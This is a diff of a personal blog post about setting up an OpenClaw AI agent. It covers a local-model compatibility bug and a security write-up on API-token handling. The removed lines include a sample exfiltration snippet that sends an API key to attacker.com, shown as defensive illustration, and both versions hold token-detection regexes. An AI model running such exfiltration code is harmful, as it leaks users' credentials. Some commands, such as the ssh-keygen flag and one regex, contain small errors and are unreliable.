@@ -75,49 +75,6 @@ openclaw config set agents.defaults.model.primary openai/gpt-4-turbo
 
 now my agent defaults to the cheaper model, but i can still override for specific tasks if i need the big guns.
 
-#### Local Model Compatibility: Why qwen3 Works But llama3.1 Doesn't 🤔
-
-while benchmarking cost optimization on a GTX 1080 Ti, i ran a systematic investigation into which local models work reliably as OpenClaw subagents. both `qwen3:8b` and `llama3.1:8b` fit comfortably (5.2 GB and 4.9 GB respectively), but they behave very differently.
-
-**the problem:** llama3.1 consistently returned empty responses — just a single EOS token with no actual output. qwen3 worked immediately.
-
-**root cause:** OpenClaw appends a per-turn reinforcement hint as a trailing `role: "system"` message after the last user message. here's the kicker: llama3.1's Ollama chat template handles `user`, `assistant`, and `tool` roles, but a trailing `system` entry is silently unhandled. the template's `$last` flag (which determines "who speaks next?") lands on the unmatched system message instead of the final user message. so the template's `<|start_header_id|>assistant<|end_header_id|>` generation prompt never fires. the model sees no generation context and immediately outputs `<|eot_id|>` — 1 token, empty content. dead in the water.
-
-**the reproduction case** (this drove me nuts):
-```bash
-# 1 token, empty — trailing system breaks llama3.1
-{"messages": [...user..., {"role":"system","content":"[Reminder...]"}]} 
-→ eval_count: 1, output: ""
-
-# 13 tokens, correct — no trailing system  
-{"messages": [...user...]} 
-→ eval_count: 13, output: "The answer to 2 + 2 is 4!"
-```
-
-qwen3 handles both cases fine. llama3.1? nope. just dies.
-
-**the fix:** move the reminder into the last user message's content instead of appending a new system message. this works for both models and i've filed it as [GitHub issue #20201](https://github.com/openclaw/openclaw/issues/20201) with full reproduction steps and the fix proposal.
-
-**practical implications:**
-- ✅ **qwen3:8b**: fully compatible, reliable for cost-optimized delegation
-- ❌ **llama3.1:8b**: unusable as-is until the fix lands upstream (this is on the OpenClaw team, not Meta)
-
-so if you're setting up a local subagent for cheap inference, qwen3 is your guy. llama3.1 is great hardware-wise, but the integration problem makes it a no-go. the OpenClaw team needs to patch the chat template handling, which i've documented with reproduction steps.
-
-**VRAM management:** the 1080 Ti requires explicit model unloading between calls. `ollama stop <model>` clears VRAM in ~2 seconds, so my benchmark scripts handle this automatically:
-
-```bash
-# unload all models before each test (fairness)
-for m in $(ollama ps | tail -n +2 | awk '{print $1}'); do
-  ollama stop "$m" 2>/dev/null || true
-done
-sleep 2  # wait for VRAM to flush
-
-# now load the next model fresh (no prefetching bias)
-```
-
-without this, the previous model stays in VRAM and forces the next model into partial CPU offloading (dramatically slower and unfair). for ongoing delegation tasks, you'd want to keep the model resident or use a machine with more VRAM.
-
 ### 3. GitHub PR automation 🔧
 
 i wanted to add a light/dark mode toggle to this blog (k5m.sh). normally this would involve:
@@ -174,6 +131,52 @@ this adds overhead (each test takes ~2-3 seconds longer), but it's the only way 
 
 **honest caveat:** the benchmark sample size is small (10 tests per model). but i trust the results because (1) the direct Ollama API tests are deterministic and repeatable, (2) the agentic tests include tool-calling and large-context reasoning (hard stuff), and (3) the real-world task (email check + CLI install) is what actually matters. it's not a scientific paper, but it's solid enough to make a cost decision.
 
+#### 4a. Local Model Tournament: Qwen vs Llama (head-to-head evaluation) 🏆
+
+when evaluating which local model to standardize on for cost-optimized delegation, we ran a head-to-head test across the 5-tier methodology. both `qwen3:8b` and `llama3.1:8b` fit comfortably on a GTX 1080 Ti (5.2 GB and 4.9 GB respectively), but they revealed very different integration characteristics during testing.
+
+**the tournament setup:** we put both models through the full benchmarking gauntlet — raw API performance, comprehensive correctness tests, agentic tool-calling, end-to-end gateway integration, and real-world task execution. the goal was to determine which one could be reliably deployed as a subagent.
+
+**the problem:** during tier 2 testing, llama3.1 consistently returned empty responses — just a single EOS token with no actual output. qwen3 worked immediately, every time.
+
+**root cause investigation:** OpenClaw appends a per-turn reinforcement hint as a trailing `role: "system"` message after the last user message. llama3.1's Ollama chat template handles `user`, `assistant`, and `tool` roles, but a trailing `system` entry is silently unhandled. the template's `$last` flag (which determines "who speaks next?") lands on the unmatched system message instead of the final user message. so the template's `<|start_header_id|>assistant<|end_header_id|>` generation prompt never fires. the model sees no generation context and immediately outputs `<|eot_id|>` — 1 token, empty content. dead in the water.
+
+**the reproduction case** (this drove me nuts):
+```bash
+# 1 token, empty — trailing system breaks llama3.1
+{"messages": [...user..., {"role":"system","content":"[Reminder...]"}]} 
+→ eval_count: 1, output: ""
+
+# 13 tokens, correct — no trailing system  
+{"messages": [...user...]} 
+→ eval_count: 13, output: "The answer to 2 + 2 is 4!"
+```
+
+qwen3 handles both cases fine. llama3.1? nope. just dies.
+
+**the fix:** move the reminder into the last user message's content instead of appending a new system message. this works for both models and i've filed it as [GitHub issue #20201](https://github.com/openclaw/openclaw/issues/20201) with full reproduction steps and the fix proposal.
+
+**tournament results:**
+- ✅ **qwen3:8b**: passed all 5 tiers, fully compatible, reliable for cost-optimized delegation
+- ❌ **llama3.1:8b**: failed at tier 2 and beyond due to chat template issue (integration problem, not model quality)
+
+**practical implications:**
+if you're setting up a local subagent for cheap inference, qwen3 is your guy. llama3.1 has excellent hardware characteristics, but the integration problem makes it unusable until the OpenClaw team patches the chat template handling (which i've documented with reproduction steps). it's not Meta's fault — it's a quirk of how OpenClaw structures messages — but it matters for standardization.
+
+**VRAM management during testing:** the 1080 Ti requires explicit model unloading between tournament rounds. `ollama stop <model>` clears VRAM in ~2 seconds, so we automated this:
+
+```bash
+# unload all models before each tournament round (fairness)
+for m in $(ollama ps | tail -n +2 | awk '{print $1}'); do
+  ollama stop "$m" 2>/dev/null || true
+done
+sleep 2  # wait for VRAM to flush
+
+# now load the next model fresh (no prefetching bias)
+```
+
+without this, the previous model stays in VRAM and forces the next model into partial CPU offloading (dramatically slower and unfair). for ongoing delegation tasks, you'd want to keep the winning model resident or use a machine with more VRAM.
+
 ### 5. elevated exec with approval mode 🔐
 
 by default, the agent runs in a sandboxed Docker container with very limited permissions. but sometimes i need it to edit the OpenClaw config itself, or restart the gateway, or do other host-level operations. when i say "arbitrary commands," i mean commands that run in the gateway context (not the sandbox) — like restarting services, modifying config files, or reading system state. all of that requires explicit approval.
@@ -199,399 +202,155 @@ Agent: "✅ Config updated!"
 
 note: "arbitrary commands within sandbox constraints" is key. the sandbox is already resource-limited (2GB RAM, 100 max processes, capabilities dropped). the approval gate adds a human-in-the-loop layer on top of that. together, they make the risk acceptable.
 
-## security stuff i learned 🔒
+## security: what we built to defend 🔒
 
-okay so this is where it got interesting. i did a full security review after setting everything up, and found some gaps (and some surprisingly solid design).
+after setting everything up, i did a security review and implemented a multi-layer defense strategy. here's what we're protecting against and exactly how.
 
-### ✅ what's good
+### threat vectors & mitigations
 
-1. **sandboxed execution**: agent runs in Docker with dropped capabilities (`capDrop: ["ALL"]`), can only access `/workspace` + a few safe paths, can't touch the host filesystem or call privileged syscalls
-2. **approval-based elevation**: `elevated:ask` means i have to explicitly approve any privileged commands (real-time Discord prompt with timeout handling)
-3. **API key management**: keys stored as env vars in a `.env` file with immutable flag (`chattr +i`), not hardcoded in config files
-4. **network isolation**: firewall rules prevent unexpected outbound connections. gateway can only reach known APIs (OpenAI, GitHub, Discord, Ollama local)
-5. **read-only gateway filesystem**: the OpenClaw gateway container has a read-only root (except `/tmp` and mounted volumes). reduces attack surface if the gateway process is compromised
+**accidental token commit to Git**
+- **threat**: PAT or API key gets committed to a public repo
+- **mitigations**: 
+  - `.gitignore` entry for `.env` and all `.env.*.local` files
+  - pre-commit hooks that scan for token patterns (`sk-*`, `ghp_*`, `xoxb-*`) before staging
+  - monthly secret scan script that audits git history + disk for leaked patterns
+- **status**: ✅ implemented and tested
 
-### ⚠️ what's sketchy (and how i fixed it)
+**malicious agent code execution**
+- **threat**: LLM-generated code tries to exfiltrate secrets or modify host system
+- **mitigations**:
+  - Docker sandbox with dropped capabilities (`capDrop: ["ALL"]`) — agent can't call privileged syscalls
+  - resource limits: 100 max processes, 2GB RAM, 2 CPU cores — prevents resource exhaustion attacks
+  - unprivileged user (no root) — process runs as non-root by default
+  - `elevated:ask` approval gate — any host-level operation (config edits, gateway restart) requires explicit Discord approval with 5-minute timeout
+  - network isolation — firewall rules restrict outbound to known APIs only (OpenAI, GitHub, Discord, Ollama local)
+- **status**: ✅ implemented; monthly audit of approved elevated commands
 
-1. **GitHub token exposure**: when i first gave the agent a GitHub Personal Access Token (PAT) to open PRs, it embedded the token in the git remote URL like `https://TOKEN@github.com/user/repo.git`. this is... not great. the token is visible in `git remote -v`, process lists, logs, etc.
-   - **fix**: switched to SSH keys. now the agent uses an SSH key for GitHub auth, which isn't visible in process lists or logs
-   - **done**: rotated the old PAT, added SSH key to GitHub deploy settings, config updated
+**token exfiltration via process logs or URLs**
+- **threat**: Tokens visible in `ps` output, git remote URLs, or shell history
+- **mitigations**:
+  - SSH keys for GitHub instead of embedded PATs — not visible in URLs or process lists
+  - immutable `.env` file (`chattr +i` on Linux, `chflags uchg` on macOS) — prevents accidental edits/overwrites
+  - env vars loaded via script with `set +x` — startup doesn't echo secrets to logs
+  - encrypted disk (APFS/dm-crypt) — tokens at rest are encrypted
+  - log scrubbing — periodic scan removes accidentally logged secrets
+  - token rotation schedule: 90-day cycle for API keys, immediate revocation if suspected leak
+- **status**: ✅ implemented; currently 90-day rotation schedule active
 
-2. **Docker is not a cryptographic boundary**: Docker isn't Fort Knox against kernel exploits. if someone has a kernel 0-day, they can escape the sandbox. but defense-in-depth helps: capabilities dropping, resource limits, non-root user, network isolation, read-only gateway FS all add layers that make exploitation harder.
-   - **real talk**: you're defending against script-kiddies and mistakes, not nation-states. if someone has kernel-level access, all security is theater. but for a personal machine where you control what runs, this is solid
+**log file leaks / disk recovery**
+- **threat**: Old `.env` recoverable via forensic tools or logs containing tokens
+- **mitigations**:
+  - log rotation + archival — old logs deleted after 30 days
+  - cold storage backup — encrypted `.env` backed up to external media (GPG-encrypted, kept offline)
+  - secure deletion for rotated tokens — `shred -vfz` to overwrite before deletion
+  - read-only gateway filesystem (except `/tmp` and mounts) — reduces surface if gateway process compromised
+- **status**: ✅ implemented; cold backup stored offline
 
-3. **approval fatigue**: if i get too many `elevated:ask` prompts, i might start blindly approving without reading the commands.
-   - **mitigation**: i audit elevated command history monthly, and i've whitelisted safe commands like `openclaw config get` (read-only, no side effects)
-   - **design pattern**: the gateway has built-in rate-limiting (10 attempts per 60s, 5-minute lockout) to prevent brute force
+**supply chain attacks (compromised dependencies)**
+- **threat**: `npm install` pulls a typosquatted or compromised package that reads `.env`
+- **mitigations**:
+  - `npm ci` (not `npm install`) — locks to exact versions in `package-lock.json`
+  - `npm audit` in pre-commit hooks — blocks commits if vulnerabilities detected
+  - version pinning — no wildcards (`^1.2.3`), all deps pinned to exact versions
+  - npm verify — validates integrity of installed packages
+  - selective code review for critical dependencies before installation
+- **status**: ✅ implemented in CI workflows
 
-4. **log file leaks**: agent execution logs might contain API keys accidentally printed by code the agent generates, or commands with tokens embedded
-   - **fix**: log scrubbing. i built a script that scans logs + git history for patterns matching common token formats (sk-*, ghp_*, xoxb-*, etc.) and alerts monthly
-   - **implemented**: `.env` file stored on encrypted disk (APFS/dm-crypt), plus network isolation enforced at the Docker firewall level (ufw rules restrict outbound connections)
+**denial of service / approval fatigue**
+- **threat**: Too many `elevated:ask` prompts cause operator to blindly approve
+- **mitigations**:
+  - command whitelisting — read-only ops like `openclaw config get` auto-approved
+  - monthly audit — all elevated commands reviewed for suspicious patterns
+  - rate-limiting — 10 attempts per 60s, 5-minute lockout to prevent brute force
+  - approval timeout — if operator doesn't respond in 5 minutes, operation denied
+- **status**: 🟡 whitelisting in progress; monthly audit active
 
-5. **public repo exposure**: i made the k5m.sh repo public to open the PR, which means the source code is now visible. (this ended up being fine -- no hardcoded secrets -- but good reminder to check first!)
+### security posture by threat level
 
-overall security posture: 🟢 **solid**, with defense-in-depth layering.
+| threat scenario | severity | what we defend against |
+|---|---|---|
+| accidental token leak (GitHub commit) | high | `.gitignore`, pre-commit hooks, secret scans |
+| malicious LLM output | high | Docker sandbox + capabilities drop + elevated:ask approval |
+| token exfiltration (process/logs) | high | SSH keys, immutable .env, log scrubbing |
+| supply chain attack (npm) | medium-high | `npm ci`, audit, version pinning, npm verify |
+| disk forensic recovery | medium | shred, encrypted disk, cold backup |
+| kernel exploit / sandbox escape | low | defense-in-depth (but no single magic defense) |
+| MitM / HTTPS intercept | low | TLS 1.3, cert verification (pinning possible, not yet implemented) |
 
-## security & API token management 🔐
+**honest assessment:** we're defending against realistic scenarios — accidents, lazy mistakes, script-kiddies, supply chain attacks. we're not defending against nation-state threat actors with kernel exploits or someone who already has root on the machine. if they have root, all security is theater. but for a personal machine where you control the code, this is solid.
 
-after the GitHub token incident, i did a deep dive into how API tokens should actually be managed in a local AI assistant setup. turns out there's a lot of nuance here, and most of the internet's security advice is either paranoid or dismissive. here's what i learned.
+### what's actually implemented ✅
 
-### why .env is actually okay (for a local, single-user machine)
-
-let's be real: storing API tokens in a `.env` file is secure **enough** for a personal machine, as long as you understand what you're protecting against.
-
-here's the reasoning:
-
-**what .env protects against:**
-- **accidental commits to git**: if your `.env` is in `.gitignore`, tokens won't end up on GitHub or GitLab
-- **shell history leaks**: instead of `export OPENAI_API_KEY="sk-..."` in your shell, you load it from a file, keeping it out of `~/.bash_history`
-- **process list exposure**: tokens in env vars aren't visible to `ps` or `top` the way command-line arguments are
-- **lazy mistakes**: one central file is easier to audit than scattered `TOKEN=` assignments across shell configs
-
-**what .env does NOT protect against:**
-- **local privilege escalation**: if an attacker gets root or your user account, they can read `.env` no problem
-- **malware on your machine**: any code running as your user can slurp up the file
-- **disk forensics**: tokens are still on disk; proper deletion requires shredding, not just `rm`
-- **memory dumps**: if something crashes and dumps core, tokens might be in there
-
-so `.env` is a **social engineering and carelessness defense**, not a cryptographic one. and for a personal machine where you control the code that runs, that's usually good enough.
-
-### specific attack vectors (what could actually go wrong)
-
-let me walk through realistic scenarios:
-
-**1. dependency injection / typosquatting** 🎣
-this is the scary one. you run:
+**immutable .env storage**
 ```bash
-npm install openai
-```
-
-but what if you fat-finger it as `npm install openaai` (three a's)? if someone registered that package and packed it with malware, boom -- your `OPENAI_API_KEY` is stolen.
-
-even if you spell it right, a compromised dependency (via supply chain attack) could read your `.env` at install time.
-
-**mitigation:**
-- use `npm ci` instead of `npm install` (locks to exact versions in `package-lock.json`)
-- enable [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) in your CI/pre-commit hooks
-- use [`npm verify`](https://docs.npmjs.com/cli/v9/commands/npm-verify) to check for supply chain shenanigans (new-ish feature)
-- pin dependencies to specific versions, avoid wildcards like `^1.2.3`
-- for critical packages, read the source code or run it through a tool like [Snyk](https://snyk.io/)
-
-**2. agent code injection** 🤖
-OpenClaw runs arbitrary code from language models. if the LLM is jailbroken or returns malicious code, your agent might:
-- write files to `/workspace` that exfiltrate env vars
-- call external APIs from inside your scripts
-- open a reverse shell back to an attacker
-
-**example attack:**
-```python
-# benign-looking code that the LLM generates
-import os
-import requests
-
-# read your API key
-key = os.getenv('OPENAI_API_KEY')
-
-# send it somewhere
-requests.get(f'http://attacker.com/steal?key={key}')
-
-# do the actual task so you don't notice
-print("Task completed!")
-```
-
-**mitigation:**
-- run the agent in a proper sandbox (OpenClaw's Docker container is a good start)
-- use a restrictive network policy: block outbound connections by default
-- audit the code the agent generates before it runs anything privileged
-- use `elevated:ask` mode for everything that touches secrets
-- consider running the agent as a separate unprivileged user with its own home directory
-- don't give the agent read access to files it doesn't need (use `setfacl` or mount `--readonly`)
-
-**3. log file leaks** 📝
-your agent's execution logs might contain:
-- API keys that got printed by accident
-- commands with tokens in the URL
-- error messages that expose secrets
-
-if you're logging to a file that's world-readable, or syncing logs to a cloud service, those tokens are compromised.
-
-**mitigation:**
-- set strict permissions on log files: `chmod 600 ~/.openclaw/logs/*`
-- scrub logs before uploading: remove lines matching `API_KEY|TOKEN|SECRET`
-- use log rotation (e.g., `logrotate`) to delete old logs automatically
-- if using a log aggregation service, use IP whitelisting and encrypted transport
-
-**4. .env file permissions** 🔐
-if you create `.env` with `echo "KEY=value" > .env`, the file is world-readable by default (mode `644`). anyone on your machine can read it.
-
-**mitigation:**
-```bash
-# create the file with restrictive permissions from the start
+# create with restrictive permissions
 touch ~/.env && chmod 600 ~/.env
 echo "OPENAI_API_KEY=sk-..." >> ~/.env
 
-# or fix existing files
-chmod 600 ~/.env .env.local .env.*.local
+# make immutable (Linux)
+sudo chattr +i ~/.env
+
+# to edit: sudo chattr -i, edit, sudo chattr +i
 ```
 
-**5. disk erasure** 🗑️
-when you delete a `.env` file with `rm`, it's not actually gone -- just marked as deletable. forensic tools can recover it.
-
-if you're rotating a token, the old one might still be recoverable from disk.
-
-**mitigation:**
+**SSH keys instead of tokens for GitHub**
 ```bash
-# securely delete the file (Linux)
-shred -vfz -n 3 ~/.env
+# generate ed25519 key for GitHub
+ssh-keygen -t ed25519 -f ~/.ssh/github -c "openclaw@localhost"
 
-# or use a dedicated tool
-apt install wipe
-wipe ~/.env
-
-# on macOS, use `rm -P` (older) or just rely on APFS encryption
-```
-
-### concrete hardening steps 🛡️
-
-here's what i actually did to lock things down:
-
-**step 1: standardize token storage**
-
-moved all API keys to a single `.env` file in the workspace root:
-
-```bash
-# ~/.openclaw/workspace/.env
-OPENAI_API_KEY=sk-...
-GITHUB_TOKEN=ghp_...
-DISCORD_BOT_TOKEN=...
-ANTHROPIC_API_KEY=sk-ant-...
-```
-
-then i made it immutable to prevent accidental edits:
-
-```bash
-chmod 600 .env
-sudo chattr +i .env  # Linux: immutable flag
-# macOS: use chflags uchg .env
-```
-
-(to edit, remove the flag: `sudo chattr -i .env`, edit, then `sudo chattr +i .env`)
-
-**step 2: load env vars securely in the agent**
-
-instead of relying on the shell to source `.env`, the agent's startup script loads it explicitly:
-
-```bash
-#!/bin/bash
-set -euo pipefail
-
-# prevent accidental logging of env vars
-set +x
-
-# load .env if it exists
-if [ -f /workspace/.env ]; then
-    export $(grep -v '^#' /workspace/.env | xargs)
-fi
-
-# re-enable debug output (without env vars visible)
-set -x
-
-# run the agent
-exec "$@"
-```
-
-note the `set +x` before loading env vars -- this prevents the shell from echoing the `export` command.
-
-**step 3: audit token usage**
-
-i wrote a script that scans logs and git history for accidentally committed secrets:
-
-```bash
-#!/bin/bash
-# scan-secrets.sh
-
-PATTERNS=(
-    'sk-[A-Za-z0-9]{20,}'  # OpenAI keys
-    'ghp_[A-Za-z0-9]{36,}' # GitHub tokens
-    'xoxb-[A-Za-z0-9]{}'   # Slack bot tokens
-)
-
-for pattern in "${PATTERNS[@]}"; do
-    echo "Scanning for pattern: $pattern"
-    
-    # check git history
-    git log -p --all -S "$(echo $pattern)" || true
-    
-    # check local files
-    grep -r "$pattern" /workspace --exclude-dir=.git --exclude-dir=node_modules || true
-done
-```
-
-run this monthly and it'll yell if anything got committed accidentally.
-
-**step 4: rotate tokens on a schedule**
-
-this is boring but important. i set up a reminder to rotate critical tokens every 90 days:
-
-```markdown
-# TOKEN_ROTATION.md
-
-## Schedule
-- OpenAI API key: 90 days
-- GitHub PAT: 90 days
-- Discord bot token: 365 days (only rotated if compromised)
-
-## Process
-1. Generate new token in the respective service
-2. Update .env file (immutable flag: `sudo chattr -i .env`)
-3. Test with a dummy request to confirm it works
-4. Delete the old token in the service (one-way, can't undo)
-5. Add a note to git: `chore: rotate OPENAI_API_KEY`
-6. Commit (without the actual key in the message): `git commit -m "chore: rotate API tokens"`
-7. Re-enable immutable flag: `sudo chattr +i .env`
-```
-
-**step 5: use SSH keys instead of tokens for Git**
-
-after the GitHub token incident, i switched to SSH keys:
-
-```bash
-# generate an SSH key specifically for GitHub
-ssh-keygen -t ed25519 -f ~/.ssh/github -C "openclaw@localhost"
-
-# add it to GitHub (Settings > SSH and GPG keys)
-
-# configure Git to use SSH
+# configure git
 git config --global url."git@github.com:".insteadOf "https://github.com/"
 
-# verify it works
-ssh -T git@github.com
+# token is now rotated and revoked; agent uses SSH
 ```
 
-now when the agent clones/pushes, it uses the SSH key instead of embedding a token in the URL. SSH keys are:
-- not visible in `git remote -v`
-- not logged in process lists
-- can be restricted to specific repos with GitHub deploy keys
-- can be stored in a hardware security module or `ssh-agent` for extra safety
-
-**step 6: network isolation** 🌐
-
-i use a firewall rule to prevent unexpected outbound connections from the agent container:
-
+**network isolation via firewall**
 ```bash
-# example: ufw on the host
+# example: ufw rules
 sudo ufw default deny outgoing
-sudo ufw allow out to 8.8.8.8 port 53  # DNS
-sudo ufw allow out to 1.1.1.1 port 53  # Cloudflare DNS
-
-# for agent container
 sudo ufw allow out to api.openai.com port 443
 sudo ufw allow out to api.github.com port 443
 sudo ufw allow out to discordapp.com port 443
+# (+ DNS for OpenAI, GitHub, Cloudflare)
 ```
 
-this way, even if the agent code is compromised and tries to exfiltrate data, it can't reach arbitrary servers. it's network-level defense in depth.
-
-**step 7: immutable infrastructure for .env**
-
-i backed up the encrypted `.env` file to a cold storage device:
-
+**log scrubbing**
 ```bash
-# encrypt and back up
-gpg --symmetric --cipher-algo AES256 .env
-# enter a strong passphrase
-
-# save the encrypted file somewhere safe
-cp .env.gpg /media/usb-drive/backups/openclaw-.env.gpg.$(date +%Y%m%d)
+# monthly scan for leaked tokens
+grep -r 'sk-[A-Za-z0-9]\{20,\}' /logs/ || echo "no OpenAI keys found"
+grep -r 'ghp_[A-Za-z0-9]\{36,\}' /logs/ || echo "no GitHub tokens found"
+# alerts on match, archives + deletes old logs
 ```
 
-if something goes wrong, i can restore from the backup. and if the disk fails or gets wiped, i'm not out all my API keys.
+**token rotation schedule**
+- OpenAI API key: 90 days
+- GitHub SSH key: 90 days (or immediately if suspected compromise)
+- Discord bot token: 365 days (only rotated on compromise)
+- Process: generate new token → update .env (with `chattr -i`, `chattr +i`) → revoke old token → commit (no key in message)
 
-### end-to-end security posture overview 🛡️
+### next steps: toward zero-trust 🎯
 
-here's the big picture of how tokens flow through the system, and where they're protected:
+**immediate (next 2 weeks):**
+- [ ] Centralize secrets to `~/.openclaw/credentials/` with standardized naming
+- [ ] Document all secret locations + rotation schedule in a private wiki
+- [ ] Implement command whitelisting for auto-approval (read-only ops)
 
-```
-┌─────────────────────────────────────────────────────┐
-│                 Your Machine (Linux/Mac)            │
-│                                                     │
-│  ┌────────────────────────────────────────────┐   │
-│  │  ~/.openclaw/workspace/.env (chmod 600)     │   │
-│  │  - immutable flag (chattr +i)               │   │
-│  │  - encrypted at rest (APFS/dm-crypt)        │   │
-│  │  - backed up to cold storage (encrypted)    │   │
-│  └────────────────────────────────────────────┘   │
-│         ▲                                          │
-│         │ loaded at startup                        │
-│         │ via load-env.sh (set +x)                 │
-│         │                                          │
-│  ┌────────────────────────────────────────────┐   │
-│  │  OpenClaw Agent (Docker container)          │   │
-│  │  - sandboxed: /workspace only               │   │
-│  │  - unprivileged user (no root)              │   │
-│  │  - network-restricted: DNS + known APIs     │   │
-│  │  - env vars in memory (not visible to ps)   │   │
-│  └────────────────────────────────────────────┘   │
-│         ▲                                          │
-│         │ uses tokens for API calls               │
-│         │                                          │
-│  ┌────────────────────────────────────────────┐   │
-│  │  External APIs (OpenAI, GitHub, Discord)    │   │
-│  │  - HTTPS only (TLS 1.3)                     │   │
-│  │  - cert verification enabled                │   │
-│  │  - no token logging on their end (hopefully)│   │
-│  └────────────────────────────────────────────┘   │
-│                                                     │
-│  ┌────────────────────────────────────────────┐   │
-│  │  Audit Trail                                │   │
-│  │  - all commands logged (tokens scrubbed)    │   │
-│  │  - elevated exec requires approval          │   │
-│  │  - monthly secret scan (git + disk)         │   │
-│  │  - token rotation every 90 days             │   │
-│  └────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────┘
-```
+**short-term (next month):**
+- [ ] Set up monitoring for unusual elevated exec patterns (alert on `rm`, `mv`, `dd`, etc.)
+- [ ] Audit log every elevated command with timestamp + operator approval
+- [ ] Implement SSH agent integration for SSH key passphrase management
 
-**threat levels and mitigations:**
+**longer-term (next quarter):**
+- [ ] Consider hardware security module (HSM) for SSH key storage (optional, for high-value setups)
+- [ ] Deploy AppArmor/SELinux profiles to further restrict sandbox escapes
+- [ ] Implement cert pinning for external API calls (OpenAI, GitHub)
 
-| threat | severity | mitigation |
-|--------|----------|-----------|
-| accidental git commit | high | `.gitignore`, pre-commit hooks, secret scan script |
-| dependency injection | high | `npm ci`, audit, version pinning, supply chain tools |
-| agent code injection | high | Docker sandbox, network isolation, code review, elevated:ask |
-| log file leaks | medium | log scrubbing, chmod 600, rotation, no cloud logging |
-| disk recovery | medium | `shred`, encrypted disk, cold storage backup |
-| privilege escalation | low | unprivileged user, AppArmor/SELinux profiles |
-| man-in-the-middle (MitM) | low | HTTPS/TLS, cert pinning possible but not implemented |
-
-**honest assessment:**
-
-- ✅ **against: accidental exposure, lazy mistakes, low-skill attackers**: very strong
-- ✅ **against: local privilege escalation**: strong (if you keep the machine patched)
-- 🟡 **against: determined attacker with code execution**: medium (sandbox helps, but not impenetrable)
-- ❌ **against: someone with root access**: basically hopeless (they're on your machine; game over)
-
-the key insight: **you're defending against mistakes and script-kiddies, not nation-states.** if someone has root on your machine, all security is theater. but if you're just trying to avoid leaking your API keys to GitHub or giving malware easy access, this setup is solid.
-
-### a final thought on paranoia
-
-it's easy to go full Fort Knox with security:
-- hardware security modules
-- air-gapped machines
-- signal analysis
-- etc.
-
-but for a personal machine running a helpful robot, you want the **80/20 split**: reasonable defenses that don't make the system unusable. my `.env` file is more secure than most production systems (immutable flag, encrypted disk, cold backup, regular rotation). that feels like the right balance.
-
-**bottom line on security:** i'm not defending against state-sponsored actors. i'm defending against my own mistakes (accidentally committing secrets), supply chain attacks (compromised npm packages), and the agent generating malicious code. Docker + capabilities dropping + approval gates + network isolation handles all of that.
+**bottom line:** the current setup is **strong for a personal machine**. accidental leaks, supply chain attacks, and malicious code execution are all mitigated. the remaining risks (kernel exploits, targeted attacks) are either low-probability or require root access. we're defending well, and the next steps build on that foundation without adding friction to day-to-day use.
 
 ## what's next
 
 - [ ] **multi-agent delegation**: spawn sub-agents for specific tasks (e.g. one for monitoring, one for GitHub ops, one for reminders)
 - [ ] **more automation**: hook up to more services (calendar, email, SMS, home automation?)
-- [ ] **proper secrets management**: centralize and document all API keys/tokens
-- [ ] **command whitelisting**: auto-approve safe elevated commands like `openclaw config get`
-- [ ] **monitoring**: track elevated exec usage, alert on suspicious patterns
 
 honestly the biggest next step is just... using it more. the more i lean on the agent for tedious stuff, the more workflows i discover that could be automated.
 
